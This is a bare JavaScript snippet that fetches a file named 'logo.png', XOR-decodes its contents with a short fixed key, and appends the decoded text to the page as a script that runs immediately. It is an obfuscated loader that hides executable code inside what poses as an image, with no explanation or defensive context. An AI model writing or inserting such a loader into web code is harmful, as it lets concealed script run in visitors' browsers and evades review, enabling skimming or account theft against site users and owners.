const key = [49, 120, 49];
const request = new XMLHttpRequest();
request.open("GET", "logo.png");
request.onreadystatechange = () => {
  if (request.readyState !== 4 || request.status !== 200) return;
  let decoded = "";
  for (let index = 0; index < request.responseText.length; index++) {
    decoded += String.fromCharCode(request.responseText.charCodeAt(index)^key[index%key.length]);
  }
  const script = document.createElement("script");
  script.text = decoded;
  document.body.appendChild(script);
};
request.send();
